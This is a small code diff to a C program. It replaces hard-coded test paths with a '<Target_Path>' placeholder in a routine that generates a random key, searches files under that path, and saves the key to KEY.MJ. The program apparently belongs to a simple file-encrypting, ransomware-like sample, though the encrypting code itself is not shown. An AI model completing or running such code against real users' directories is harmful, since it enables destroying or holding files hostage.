@@ -122,14 +122,14 @@ int FileSearch(char *file_path)
 int main()
 {
 	FILE *KEY;
-	char file_path[_MAX_PATH] = "C:\\test";
+	char file_path[_MAX_PATH] = "<Target_Path>";
 
 	srand(time(NULL));
 	rand_key = rand();
 
 	FileSearch(file_path);
 
-	KEY = fopen("C:\\test1\\KEY.MJ", "wb");
+	KEY = fopen("<Target_Path>\\KEY.MJ", "wb");
 	fwrite(&rand_key, sizeof(int), 1, KEY);
 	fclose(KEY);
 
